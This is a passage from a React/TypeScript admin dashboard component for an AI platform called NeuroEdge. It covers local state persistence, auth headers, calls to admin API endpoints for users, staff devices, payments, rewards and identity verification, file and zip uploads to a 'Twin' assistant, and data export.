      const raw = localStorage.getItem("neuroedge_saved_prompts_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "sp1", title: "Research Brief", text: "Summarize latest trends with sources." },
            { id: "sp2", title: "Code Review", text: "Review this code for bugs and regressions." },
          ];
    } catch {
      return [];
    }
  });
  const [newPromptTitle, setNewPromptTitle] = useState("");
  const [newPromptText, setNewPromptText] = useState("");
  const [selectedAgentId, setSelectedAgentId] = useState("");
  const [newDepartmentName, setNewDepartmentName] = useState("");
  const [newDepartmentMembers, setNewDepartmentMembers] = useState("5");
  const [newDepartmentTokens, setNewDepartmentTokens] = useState("50000");
  const [enterpriseDepartments, setEnterpriseDepartments] = useState<EnterpriseDepartment[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_enterprise_departments_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "d1", name: "Engineering", members: 12, tokensPerMonth: 210000 },
            { id: "d2", name: "Support", members: 7, tokensPerMonth: 54000 },
          ];
    } catch {
      return [];
    }
  });
  const [ssoConfig, setSsoConfig] = useState(() => {
    try {
      const raw = localStorage.getItem("neuroedge_enterprise_sso_v1");
      return raw
        ? JSON.parse(raw)
        : {
            enabled: false,
            provider: "okta",
            domain: "",
            clientId: "",
            metadataUrl: "",
          };
    } catch {
      return { enabled: false, provider: "okta", domain: "", clientId: "", metadataUrl: "" };
    }
  });
  const [newOfferName, setNewOfferName] = useState("");
  const [newOfferPct, setNewOfferPct] = useState("10");
  const [staffName, setStaffName] = useState("");
  const [staffEmail, setStaffEmail] = useState("");
  const [staffRole, setStaffRole] = useState<"admin" | "developer">("admin");
  const [staffDeviceId, setStaffDeviceId] = useState("");
  const [futureFeatures, setFutureFeatures] = useState([
    { id: "f1", name: "Voice-native AI Calls", phase: "design", owner: "founder", priority: "high" },
    { id: "f2", name: "Autonomous Workflow Builder", phase: "in_progress", owner: "platform", priority: "high" },
    { id: "f3", name: "Enterprise Data Residency", phase: "planned", owner: "enterprise", priority: "medium" },
    { id: "f4", name: "Realtime Co-Pilot Screen Assist", phase: "planned", owner: "product", priority: "high" },
  ]);
  const [brandingDraft, setBrandingDraft] = useState<BrandingConfig>(() => loadBranding());

  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_users_v1", JSON.stringify(users));
  }, [users]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_offers_v1", JSON.stringify(offers));
  }, [offers]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_plans_v1", JSON.stringify(plans));
  }, [plans]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_payment_v1", JSON.stringify(payment));
  }, [payment]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_crypto_rewards_v1", JSON.stringify(cryptoRewards));
  }, [cryptoRewards]);
  useEffect(() => {
    localStorage.setItem("neuroedge_rewards_ledger_v1", JSON.stringify(rewardsLedger));
  }, [rewardsLedger]);
  useEffect(() => {
    localStorage.setItem("neuroedge_feature_flags_v2", JSON.stringify(featureFlags));
  }, [featureFlags]);
  useEffect(() => {
    localStorage.setItem("neuroedge_model_control_v2", JSON.stringify(modelControl));
  }, [modelControl]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dev_api_keys_v1", JSON.stringify(devApiKeys));
  }, [devApiKeys]);
  useEffect(() => {
    localStorage.setItem("neuroedge_webhooks_v1", JSON.stringify(webhooks));
  }, [webhooks]);
  useEffect(() => {
    localStorage.setItem("neuroedge_integrations_v1", JSON.stringify(integrations));
  }, [integrations]);
  useEffect(() => {
    localStorage.setItem("neuroedge_domain_links_v1", JSON.stringify(domainLinks));
  }, [domainLinks]);
  useEffect(() => {
    localStorage.setItem("neuroedge_support_tickets_v1", JSON.stringify(supportTickets));
  }, [supportTickets]);
  useEffect(() => {
    localStorage.setItem("neuroedge_agent_profiles_v1", JSON.stringify(agentsLocal));
  }, [agentsLocal]);
  useEffect(() => {
    localStorage.setItem("neuroedge_saved_prompts_v1", JSON.stringify(savedPrompts));
  }, [savedPrompts]);
  useEffect(() => {
    localStorage.setItem("neuroedge_enterprise_departments_v1", JSON.stringify(enterpriseDepartments));
  }, [enterpriseDepartments]);
  useEffect(() => {
    localStorage.setItem("neuroedge_enterprise_sso_v1", JSON.stringify(ssoConfig));
  }, [ssoConfig]);
  useEffect(() => {
    const sync = () => setBrandingDraft(loadBranding());
    window.addEventListener("neuroedge:brandingUpdated", sync as EventListener);
    window.addEventListener("storage", sync);
    return () => {
      window.removeEventListener("neuroedge:brandingUpdated", sync as EventListener);
      window.removeEventListener("storage", sync);
    };
  }, []);
  useEffect(() => {
    if (!agentsLocal.length) {
      setSelectedAgentId("");
      return;
    }
    if (!selectedAgentId || !agentsLocal.find((a) => a.id === selectedAgentId)) {
      setSelectedAgentId(agentsLocal[0].id);
    }
  }, [agentsLocal, selectedAgentId]);

  const authContext = () => {
    const envToken = String((import.meta.env.VITE_NEUROEDGE_JWT as string) || "").trim();
    const envApiKey = String((import.meta.env.VITE_NEUROEDGE_API_KEY as string) || "").trim();
    const envOrg = String((import.meta.env.VITE_DEFAULT_ORG_ID as string) || "personal").trim();
    const envWorkspace = String((import.meta.env.VITE_DEFAULT_WORKSPACE_ID as string) || "default").trim();
    let userToken = "";
    let sessionToken = "";
    let userOrg = "";
    let userWorkspace = "";
    let userEmail = "";
    let userName = "";
    let userRole = "";
    let deviceId = "";
    try {
      deviceId = localStorage.getItem("neuroedge_device_id") || "";
      if (!deviceId) {
        deviceId = `dev-${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
        localStorage.setItem("neuroedge_device_id", deviceId);
      }
      const rawUser = localStorage.getItem("neuroedge_user");
      if (rawUser) {
        const parsed = JSON.parse(rawUser);
        userToken = String(parsed?.token || "");
        userOrg = String(parsed?.orgId || "");
        userWorkspace = String(parsed?.workspaceId || "");
        userEmail = String(parsed?.email || "");
        userName = String(parsed?.name || "");
        userRole = String(parsed?.role || "");
      }
      const rawSession = localStorage.getItem("neuroedge_session");
      if (rawSession) {
        const parsed = JSON.parse(rawSession);
        sessionToken = String(parsed?.token || "");
        userOrg = userOrg || String(parsed?.orgId || "");
        userWorkspace = userWorkspace || String(parsed?.workspaceId || "");
        userEmail = userEmail || String(parsed?.email || "");
        userName = userName || String(parsed?.name || "");
        userRole = userRole || String(parsed?.role || "");
      }
    } catch {
      // ignore localStorage parsing issues and fallback to env defaults
    }
    return {
      token: envToken || userToken || sessionToken,
      apiKey: envApiKey,
      orgId: userOrg || envOrg || "personal",
      workspaceId: userWorkspace || envWorkspace || "default",
      userEmail,
      userName,
      userRole,
      deviceId,
    };
  };

  const apiBase = String(import.meta.env.VITE_ORCHESTRATOR_URL || "http://localhost:7070");
  const headers = () => {
    const auth = authContext();
    const h: Record<string, string> = {
      "Content-Type": "application/json",
      "x-org-id": auth.orgId,
      "x-workspace-id": auth.workspaceId,
    };
    if (auth.userEmail) h["x-user-email"] = auth.userEmail;
    if (auth.userName) h["x-user-name"] = auth.userName;
    if (auth.userRole) h["x-user-role"] = auth.userRole;
    if (auth.deviceId) h["x-device-id"] = auth.deviceId;
    if (auth.token) h.Authorization = `Bearer ${auth.token}`;
    if (auth.apiKey) {
      h["x-api-key"] = auth.apiKey;
      if (!h.Authorization) h.Authorization = `Bearer ${auth.apiKey}`;
    }
    return h;
  };

  const getJson = async (path: string) => {
    const res = await fetch(`${apiBase}${path}`, { headers: headers() });
    if (!res.ok) throw new Error(await res.text());
    return res.json();
  };
  const postJson = async (path: string, body: unknown) => {
    const res = await fetch(`${apiBase}${path}`, {
      method: "POST",
      headers: headers(),
      body: JSON.stringify(body),
    });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data?.error || data?.message || `HTTP ${res.status}`);
    return data;
  };

  const applyRemoteDashboard = (remote: any) => {
    if (!remote || typeof remote !== "object") return;
    if (Array.isArray(remote.users)) setUsers(remote.users);
    if (Array.isArray(remote.offers)) setOffers(remote.offers);
    if (Array.isArray(remote.plans)) setPlans(remote.plans);
    if (remote.payment && typeof remote.payment === "object") setPayment(remote.payment);
    if (remote.cryptoRewards && typeof remote.cryptoRewards === "object") setCryptoRewards(remote.cryptoRewards);
    if (remote.modelControl && typeof remote.modelControl === "object") setModelControl(remote.modelControl);
    if (remote.rewardsLedger && typeof remote.rewardsLedger === "object") setRewardsLedger(remote.rewardsLedger);
    if (remote.idverse && typeof remote.idverse === "object") {
      setIdverseConfig((prev) => ({
        ...prev,
        ...remote.idverse,
      }));
    }
    if (remote.featureFlags && typeof remote.featureFlags === "object") setFeatureFlags(remote.featureFlags);
    if (Array.isArray(remote.supportTickets)) setSupportTickets(remote.supportTickets);
    if (Array.isArray(remote.devApiKeys)) setDevApiKeys(remote.devApiKeys);
    if (Array.isArray(remote.webhooks)) setWebhooks(remote.webhooks);
    if (Array.isArray(remote.integrations)) setIntegrations(remote.integrations);
    if (Array.isArray(remote.domainLinks)) setDomainLinks(remote.domainLinks);
    if (remote.accessControl && typeof remote.accessControl === "object") setAccessControl(remote.accessControl);
    if (Array.isArray(remote.permissionCatalog)) setPermissionCatalog(remote.permissionCatalog);
    if (remote.deviceProtection && typeof remote.deviceProtection === "object") setDeviceProtection(remote.deviceProtection);
    if (Array.isArray(remote.agentsLocal)) setAgentsLocal(remote.agentsLocal);
    if (Array.isArray(remote.savedPrompts)) setSavedPrompts(remote.savedPrompts);
    if (Array.isArray(remote.enterpriseDepartments)) setEnterpriseDepartments(remote.enterpriseDepartments);
    if (remote.ssoConfig && typeof remote.ssoConfig === "object") setSsoConfig(remote.ssoConfig);
  };

  const callAction = async (path: string, body: any) => {
    try {
      const isGet = path.startsWith("GET:");
      const target = isGet ? path.replace("GET:", "") : path;
      const data = isGet ? await getJson(target) : await postJson(target, body);
      if (Array.isArray(data.users)) setUsers(data.users);
      if (Array.isArray(data.offers)) setOffers(data.offers);
      if (Array.isArray(data.plans)) setPlans(data.plans);
      if (data.payment) setPayment(data.payment);
      if (data.cryptoRewards) setCryptoRewards(data.cryptoRewards);
      if (data.modelControl) setModelControl(data.modelControl);
      if (data.rewardsLedger) setRewardsLedger(data.rewardsLedger);
      if (data.idverse) {
        setIdverseConfig((prev) => ({
          ...prev,
          ...data.idverse,
          apiKey: prev.apiKey,
        }));
      }
      if (data.featureFlags) setFeatureFlags(data.featureFlags);
      if (Array.isArray(data.supportTickets)) setSupportTickets(data.supportTickets);
      if (Array.isArray(data.devApiKeys)) setDevApiKeys(data.devApiKeys);
      if (Array.isArray(data.webhooks)) setWebhooks(data.webhooks);
      if (Array.isArray(data.integrations)) setIntegrations(data.integrations);
      if (Array.isArray(data.domainLinks)) setDomainLinks(data.domainLinks);
      if (data?.summary && data?.summary?.windowHours && data?.summary?.hallucinationRiskScore !== undefined) {
        setQualityTrust(data.summary);
      }
      if (data?.summary && data?.summary?.windowHours && data?.summary?.researchRuns !== undefined) {
        setQualityRetrieval(data.summary);
      }
      if (data?.snapshot && data?.snapshot?.windowHours) {
        setQualityReliability(data.snapshot);
      }
      if (data?.coverage && typeof data.coverage === "object") {
        setQualityEvalCoverage(data.coverage);
      }
      if (data?.router || data?.outcomes) {
        setQualityModelSummary({
          router: data.router || {},
          outcomes: data.outcomes || {},
        });
      }
      if (Array.isArray(data?.baselines)) {
        setBenchmarkBaselinesDraft(JSON.stringify(data.baselines, null, 2));
      }
      if (data?.config?.variants && Array.isArray(data.config.variants)) {
        setModelRouterDraft(JSON.stringify(data.config.variants, null, 2));
      }
      if (data?.program && Array.isArray(data.program.items) && Array.isArray(data.program.milestones)) {
        setFrontierProgram(data.program);
      }
      if (data?.readiness && typeof data.readiness === "object") {
        setFrontierReadiness(data.readiness);
      }
      if (data.accessControl && typeof data.accessControl === "object") setAccessControl(data.accessControl);
      if (Array.isArray(data.permissionCatalog)) setPermissionCatalog(data.permissionCatalog);
      if (data.deviceProtection && typeof data.deviceProtection === "object") setDeviceProtection(data.deviceProtection);
      if (typeof data.apiKey === "string" && data.apiKey) setLatestGeneratedApiKey(data.apiKey);
      if (Array.isArray(data.agentsLocal)) setAgentsLocal(data.agentsLocal);
      if (Array.isArray(data.savedPrompts)) setSavedPrompts(data.savedPrompts);
      if (Array.isArray(data.enterpriseDepartments)) setEnterpriseDepartments(data.enterpriseDepartments);
      if (data.ssoConfig) setSsoConfig(data.ssoConfig);
      return data;
    } catch (err: any) {
      addNotification({ type: "error", message: err?.message || String(err) });
      return null;
    }
  };

  const runGuarded = async (title: string, fn: () => Promise<any>, actionLabel = "delete") => {
    if (!confirmSafeAction({ title, actionLabel })) return;
    const data = await fn();
    if (data) addNotification({ type: "warn", message: recoveryGuidance(title) });
  };

  useEffect(() => {
    const loadDashboardState = async () => {
      try {
        const data = await getJson("/admin/dashboard/bootstrap");
        applyRemoteDashboard(data?.dashboard || {});
      } catch {
        // fallback to local state
      }
      try {
        const access = await getJson("/admin/dashboard/access/bootstrap");
        if (Array.isArray(access?.permissionCatalog)) setPermissionCatalog(access.permissionCatalog);
        if (access?.accessControl && typeof access.accessControl === "object") setAccessControl(access.accessControl);
      } catch {
        // ignore when not authorized
      }
      try {
        const security = await getJson("/admin/device-protection/bootstrap");
        if (security?.deviceProtection && typeof security.deviceProtection === "object") {
          setDeviceProtection(security.deviceProtection);
        }
      } catch {
        // ignore when not authorized
      }
    };
    loadDashboardState();
    loadCreatorHistory();
    refreshQualityInsights();
    refreshFrontierProgram();
  }, []);

  useEffect(() => {
    const refresh = async () => {
      const nextServices: ServiceStatus[] = [];
      try {
        const orchestratorHealth = await getJson("/health");
        nextServices.push({
          name: "Orchestrator",
          status: orchestratorHealth?.status === "ok" ? "online" : "degraded",
          detail: orchestratorHealth?.status === "ok" ? "Serving API" : "Health degraded",
        });
      } catch {
        nextServices.push({ name: "Orchestrator", status: "offline", detail: "Not reachable" });
      }
      try {
        const sys = await getJson("/system/status");
        if (Array.isArray(sys?.services)) {
          sys.services.forEach((s: ServiceStatus) => nextServices.push(s));
        }
      } catch {
        // ignore
      }
      setServices(nextServices);

      const calls = await Promise.allSettled(
        [
          getJson("/kernels"),
          canAccessAdminOps ? getJson("/admin/usage") : Promise.resolve({ usage: {} }),
          canAccessAdminOps ? getJson("/admin/logs?limit=250") : Promise.resolve({ logs: [] }),
          canAccessAdminOps ? getJson("/admin/audit?limit=250") : Promise.resolve({ audit: [] }),
          canAccessAdminOps ? getJson("/admin/agents") : Promise.resolve({ agents: [] }),
          canAccessAdminOps ? getJson("/admin/version") : Promise.resolve({}),
          canAccessAdminOps ? getJson("/admin/system/metrics") : Promise.resolve({}),
        ]
      );
      if (calls[0].status === "fulfilled") {
        const ks: KernelSnapshot[] = Object.entries(calls[0].value || {}).map(([name, info]: [string, any]) => ({
          name,
          status: info?.status || "unknown",
          version: info?.version || "unknown",
        }));
        setKernels(ks);
      }
      if (calls[1].status === "fulfilled") setUsage(calls[1].value?.usage || {});
      if (calls[2].status === "fulfilled") setAdminLogs(calls[2].value?.logs || []);
      if (calls[3].status === "fulfilled") setAdminAudit(calls[3].value?.audit || []);
      if (calls[4].status === "fulfilled") setAdminAgents(calls[4].value?.agents || []);
      if (calls[5].status === "fulfilled") setAdminVersion(calls[5].value || {});
      if (calls[6].status === "fulfilled") setAdminMetrics(calls[6].value || {});
      refreshQualityInsights();
    };
    refresh();
    const t = setInterval(refresh, 15000);
    return () => clearInterval(t);
  }, [canAccessAdminOps]);

  useEffect(() => {
    if (!canAccessAdminOps) return;
    (async () => {
      try {
        const data = await getJson("/admin/training/bootstrap-pack/auto-refresh/status");
        if (data?.config) {
          setAutoRefreshEnabled(Boolean(data.config.enabled));
          setAutoRefreshHourUtc(String(data.config.hourUtc ?? "2"));
          setAutoRefreshMinuteUtc(String(data.config.minuteUtc ?? "10"));
          setAutoRefreshStaleHours(String(data.config.staleHours ?? "36"));
        }
      } catch {
        // ignore if not authorized
      }
    })();
  }, [canAccessAdminOps]);

  const localMsgStats = useMemo(() => {
    const all = chatContext.getAll();
    return {
      total: all.length,
      errors: all.filter((m) => m.role === "assistant" && String(m.content || "").startsWith("❌")).length,
      warnings: all.filter((m) => m.role === "assistant" && String(m.content || "").startsWith("⚠️")).length,
    };
  }, []);

  const conversationStats = useMemo(() => {
    const all = listConversations();
    return {
      chats: all.length,
      messages: all.reduce((acc, c) => acc + c.messages.length, 0),
      latest: all[0]?.title || "No chats yet",
    };
  }, []);

  const tokenTotal = Number(usage?.totals?.totalTokens || 0);
  const reqTotal = Number(usage?.totals?.requests || 0);
  const estRevenue = Number(((tokenTotal / 1_000_000) * 8.5).toFixed(2));
  const securityAlerts = adminAudit.filter((a) =>
    String(a?.type || "").startsWith("doctrine.") || String(a?.type || "").startsWith("policy.")
  );

  const assignRole = async (id: string, role: UserRecord["role"]) => {
    await callAction("/admin/dashboard/users/role", { id, role });
    addNotification({ type: "success", message: `Role updated for ${id}` });
  };

  const localDeviceId = () => {
    let id = "";
    try {
      id = localStorage.getItem("neuroedge_device_id") || "";
      if (!id) {
        id = `dev-${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
        localStorage.setItem("neuroedge_device_id", id);
      }
    } catch {
      id = `dev-${Date.now()}`;
    }
    return id;
  };

  const registerStaffUser = async () => {
    const name = staffName.trim();
    const email = staffEmail.trim().toLowerCase();
    if (!name || !email) {
      addNotification({ type: "error", message: "Enter staff name and email." });
      return;
    }
    const deviceId = staffDeviceId.trim() || localDeviceId();
    const data = await callAction("/admin/dashboard/staff/register", {
      user: {
        name,
        email,
        role: staffRole,
        allowedDeviceId: deviceId,
      },
    });
    if (data?.success) {
      setStaffName("");
      setStaffEmail("");
      setStaffDeviceId("");
      addNotification({ type: "success", message: `${staffRole} account registered and device-bound.` });
    }
  };

  const bindStaffDevice = async (id: string, deviceId: string) => {
    const nextDevice = deviceId.trim() || localDeviceId();
    const data = await callAction("/admin/dashboard/staff/device/bind", { id, allowedDeviceId: nextDevice });
    if (data?.success) addNotification({ type: "success", message: `Device bound for ${id}` });
  };

  const setStaffAccess = async (id: string, action: "allow" | "suspend" | "revoke") => {
    const data = await callAction("/admin/dashboard/staff/access", { id, action });
    if (data?.success) addNotification({ type: "success", message: `Account ${id}: ${action}` });
  };

  const updateUserStatus = async (id: string, status: UserRecord["status"]) => {
    await callAction("/admin/dashboard/users/status", { id, status });
    addNotification({ type: "success", message: `Status updated for ${id}` });
  };

  const savePaymentDetails = async () => {
    const digits = paymentDraftCard.replace(/\D/g, "");
    if (digits.length < 12) {
      addNotification({ type: "error", message: "Enter a valid payment card number." });
      return;
    }
    const masked = `${"*".repeat(Math.max(0, digits.length - 4))}${digits.slice(-4)}`;
    const nextPayment = { ...payment, cardNumberMasked: masked };
    await callAction("/admin/dashboard/payment/save", { payment: nextPayment });
    setPaymentDraftCard("");
    addNotification({ type: "success", message: "Payment profile saved in dashboard settings." });
  };

  const addOffer = async () => {
    const pct = Number(newOfferPct);
    if (!newOfferName.trim() || !Number.isFinite(pct) || pct <= 0 || pct > 90) {
      addNotification({ type: "error", message: "Enter offer name and discount (1-90)." });
      return;
    }
    await callAction("/admin/dashboard/offers/upsert", {
      offer: {
        name: newOfferName.trim(),
        discountPct: pct,
        active: true,
        audience: "all",
      },
    });
    setNewOfferName("");
    setNewOfferPct("10");
    addNotification({ type: "success", message: "Offer created." });
  };

  const toggleFlag = async (k: string) => {
    await callAction("/admin/dashboard/flags/toggle", { key: k });
  };

  const addPlan = async () => {
    const name = window.prompt("Plan name:");
    if (!name) return;
    const monthly = Number(window.prompt("Monthly price:", "29"));
    const annual = Number(window.prompt("Annual price:", "290"));
    if (!Number.isFinite(monthly) || !Number.isFinite(annual)) return;
    await callAction("/admin/dashboard/plans/upsert", {
      plan: { name, monthly, annual, active: true, features: ["Custom Plan"] },
    });
    addNotification({ type: "success", message: `${name} plan added.` });
  };

  const exportData = (name: string, data: unknown) => {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${name}_${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const toOutputText = (data: unknown) => (typeof data === "string" ? data : JSON.stringify(data, null, 2));

  const downloadText = (name: string, ext: string, mime: string, content: string) => {
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${name}_${Date.now()}.${ext}`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const escapeHtml = (value: string) =>
    value
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");

  const exportOutputTxt = (name: string, data: unknown) => {
    downloadText(name, "txt", "text/plain;charset=utf-8", toOutputText(data));
  };

  const exportOutputWord = (name: string, data: unknown) => {
    const safe = escapeHtml(toOutputText(data));
    const docHtml = `<!doctype html><html><head><meta charset="utf-8"><title>${name}</title></head><body><pre>${safe}</pre></body></html>`;
    downloadText(name, "doc", "application/msword", docHtml);
  };

  const printOutputPdf = (title: string, data: unknown) => {
    const w = window.open("", "_blank", "width=1024,height=760");
    if (!w) {
      addNotification({ type: "error", message: "Popup blocked. Allow popups to print/export PDF." });
      return;
    }
    const safe = escapeHtml(toOutputText(data));
    w.document.write(
      `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title><style>body{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;padding:20px;}h1{font-family:system-ui,sans-serif;font-size:18px;}pre{white-space:pre-wrap;line-height:1.4;}</style></head><body><h1>${title}</h1><pre>${safe}</pre></body></html>`
    );
    w.document.close();
    w.focus();
    w.print();
  };

  const saveModelControl = async () => {
    await callAction("/admin/dashboard/model/save", { modelControl });
    addNotification({ type: "success", message: "Model control saved." });
  };

  const saveCryptoRewards = async () => {
    await callAction("/admin/dashboard/crypto/save", { cryptoRewards });
    addNotification({ type: "success", message: "Crypto rewards configuration saved." });
  };

  const saveRewardsConfig = async () => {
    await callAction("/admin/dashboard/rewards/config/save", { config: rewardsLedger.config });
    addNotification({ type: "success", message: "Rewards conversion config saved." });
  };

  const saveIdverseConfig = async () => {
    const payload = {
      idverse: {
        enabled: idverseConfig.enabled,
        baseUrl: idverseConfig.baseUrl.trim(),
        projectId: idverseConfig.projectId.trim(),
        timeoutMs: Number(idverseConfig.timeoutMs) || 12000,
        strictBiometric: idverseConfig.strictBiometric,
        strictLiveness: idverseConfig.strictLiveness,
        apiKey: idverseConfig.apiKey.trim() || idverseConfig.apiKeyMasked || "",
      },
    };
    const data = await callAction("/admin/dashboard/idverse/save", payload);
    if (data?.idverse) {
      setIdverseConfig((prev) => ({
        ...prev,
        ...data.idverse,
        apiKey: "",
      }));
      addNotification({ type: "success", message: "IDVerse configuration saved." });
    }
  };

  const checkIdverseStatus = async () => {
    try {
      const data = await getJson("/idverse/status");
      setIdverseStatus(data);
      addNotification({ type: "info", message: data?.healthy ? "IDVerse is healthy." : "IDVerse is not healthy." });
    } catch (err: any) {
      setIdverseStatus({ success: false, error: err?.message || String(err) });
      addNotification({ type: "error", message: err?.message || "IDVerse status check failed." });
    }
  };

  const runIdverseVerifySample = async () => {
    const data = await callAction("/neuroedge/verify-identity", {
      userId: "sample-user",
      docType: "passport",
      country: "UG",
      sessionId: `dash-${Date.now()}`,
    });
    if (data) setBackendOutput(data);
  };

  const creditPoints = async () => {
    const points = Number(rewardPointsInput || 0);
    if (!rewardUserId.trim() || points <= 0) {
      addNotification({ type: "error", message: "Enter user ID and positive points." });
      return;
    }
    await callAction("/admin/dashboard/rewards/wallets/credit", {
      userId: rewardUserId.trim(),
      userName: rewardUserName.trim() || "User",
      points,
    });
    addNotification({ type: "success", message: "Points credited." });
  };

  const debitPoints = async () => {
    const points = Number(rewardPointsInput || 0);
    if (!rewardUserId.trim() || points <= 0) {
      addNotification({ type: "error", message: "Enter user ID and positive points." });
      return;
    }
    await callAction("/admin/dashboard/rewards/wallets/debit", {
      userId: rewardUserId.trim(),
      points,
    });
    addNotification({ type: "success", message: "Points debited." });
  };

  const convertPoints = async (target: "cash" | "wdc") => {
    const points = Number(rewardPointsInput || 0);
    if (!rewardUserId.trim() || points <= 0) {
      addNotification({ type: "error", message: "Enter user ID and positive points." });
      return;
    }
    await callAction("/admin/dashboard/rewards/wallets/convert", {
      userId: rewardUserId.trim(),
      points,
      target,
    });
    addNotification({ type: "success", message: `Points converted to ${target.toUpperCase()} pending balance.` });
  };

  const runTwinAction = async (path: string, body: any = {}) => {
    try {
      const isGet = path.startsWith("GET:");
      const target = isGet ? path.replace("GET:", "") : path;
      const data = isGet ? await getJson(target) : await postJson(target, body);
      setTwinOutput(data);
      addNotification({ type: "success", message: "Twin action completed." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Twin action failed: ${err?.message || err}` });
    }
  };

  const askTwin = async () => {
    const q = twinQuestion.trim();
    if (!q) {
      addNotification({ type: "warn", message: "Type a question for Twin first." });
      return;
    }
    await runTwinAction("/twin/ask", {
      question: q,
      uploaded_files: twinUploadedFiles,
      uploaded_zips: twinUploadedZips,
      zip_path: twinZipPath.trim(),
      include_scan: true,
      include_analyze: twinIncludeAnalyze,
      include_report: twinIncludeReport,
    });
  };

  const handleTwinUpload = async (files: FileList | null) => {
    if (!files || files.length === 0) return;
    const next: Array<{ name: string; type: string; size: number; text_sample: string }> = [];
    for (const f of Array.from(files).slice(0, 100)) {
      const isTextLike =
        f.type.startsWith("text/") ||
        /\.(md|txt|json|ya?ml|ts|tsx|js|jsx|py|go|rs|java|sql|sh|env|toml|ini|csv)$/i.test(f.name);
      let textSample = "";
      if (isTextLike) {
        try {
          textSample = (await f.text()).slice(0, 8000);
        } catch {
          textSample = "";
        }
      }
      next.push({
        name: (f as any).webkitRelativePath || f.name,
        type: f.type || "application/octet-stream",
        size: f.size,
        text_sample: textSample,
      });
    }
    setTwinUploadedFiles((prev) => [...prev, ...next]);
    addNotification({ type: "success", message: `Twin received ${next.length} file(s).` });
  };

  const handleTwinZipUpload = async (files: FileList | null) => {
    if (!files || files.length === 0) return;
    const tierLimitsMb: Record<UploadTier, { perZip: number; total: number; wire: number }> = {
      founder: { perZip: 102400, total: 307200, wire: 30 }, // 100GB each, 300GB total policy
      admin: { perZip: 20480, total: 61440, wire: 25 }, // 20GB each, 60GB total policy
      paid: { perZip: 5120, total: 15360, wire: 20 }, // 5GB each, 15GB total policy
      free: { perZip: Number(import.meta.env.VITE_TWIN_MAX_ZIP_MB || 8), total: Number(import.meta.env.VITE_TWIN_MAX_TOTAL_ZIP_MB || 20), wire: 12 },
    };
    const policy = tierLimitsMb[twinUploadTier];
    const maxZipMb = policy.perZip;
    const maxTotalMb = policy.total;
    const maxWireMb = policy.wire; // direct JSON/base64 transfer practical ceiling
    const maxZipBytes = Math.max(1, maxZipMb) * 1024 * 1024;
    const maxTotalBytes = Math.max(1, maxTotalMb) * 1024 * 1024;
    const maxWireBytes = Math.max(1, maxWireMb) * 1024 * 1024;
    const zips = Array.from(files).filter((f) => f.name.toLowerCase().endsWith(".zip")).slice(0, 5);
    if (zips.length === 0) {
      addNotification({ type: "warn", message: "Select one or more .zip files." });
      return;
    }
    const encoded: Array<{ name: string; data_base64: string }> = [];
    let totalBytes = 0;
    for (const f of zips) {
      if (f.size > maxZipBytes) {
        addNotification({
          type: "warn",
          message: `Skipped ${f.name}: exceeds ${maxZipMb}MB per zip limit.`,
        });
        continue;
      }
      if (f.size > maxWireBytes) {
        const possiblePath = (f as any).path || (f as any).webkitRelativePath || "";
        if (possiblePath && !twinZipPath) {
          setTwinZipPath(possiblePath);
          addNotification({
            type: "info",
            message: `${f.name} is large. Switched to server-path mode via zip path.`,
          });
        } else {
          addNotification({
            type: "warn",
            message:
              `${f.name} is too large for browser JSON upload (${maxWireMb}MB wire limit). ` +
              `Use Server zip path mode for very large files (Founder/Admin large-file workflow).`,
          });
        }
        continue;
      }
      if (totalBytes + f.size > maxTotalBytes) {
        addNotification({
          type: "warn",
          message: `Upload limit reached (${maxTotalMb}MB total). Remaining zips skipped.`,
        });
        break;
      }
      try {
        const buf = await f.arrayBuffer();
        const bytes = new Uint8Array(buf);
        let binary = "";
        const chunk = 0x8000;
        for (let i = 0; i < bytes.length; i += chunk) {
          binary += String.fromCharCode(...bytes.subarray(i, i + chunk));
        }
        encoded.push({ name: f.name, data_base64: btoa(binary) });
        totalBytes += f.size;
      } catch {
        // skip failed file
      }
    }
    setTwinUploadedZips((prev) => [...prev, ...encoded]);
    addNotification({
      type: "success",
      message: `Twin received ${encoded.length} zip file(s). Tier: ${twinUploadTier}.`,
    });
  };

  const runBackendAction = async (path: string, body: any = {}) => {
    try {
      const isGet = path.startsWith("GET:");
      const target = isGet ? path.replace("GET:", "") : path;
      const data = isGet ? await getJson(target) : await postJson(target, body);
      setBackendOutput(data);
      addNotification({ type: "success", message: "Backend action completed." });
    } catch (err: any) {
      addNotification({ type: "error", message: `Backend action failed: ${err?.message || err}` });
    }
  };

  const runEndpointConsole = async () => {
    const path = endpointPath.trim();
    if (!path.startsWith("/")) {
      addNotification({ type: "error", message: "Path must start with /" });
      return;
    }
    if (endpointMethod === "GET") {
      await runBackendAction(`GET:${path}`);
      return;
    }
    let payload: any = {};
    const raw = endpointBody.trim();
    if (raw) {
      try {
        payload = JSON.parse(raw);
      } catch {
        addNotification({ type: "error", message: "Invalid JSON body." });
        return;
      }
    }
    await runBackendAction(path, payload);
  };

  const loadCreatorHistory = async () => {
    try {
      const data = await getJson("/creator/history?limit=50");
      setCreatorHistory(Array.isArray(data?.history) ? data.history : []);
    } catch (err: any) {
      addNotification({ type: "error", message: err?.message || "Failed to load creator history" });
    }
  };

  const pollCreatorJob = async (id: string) => {
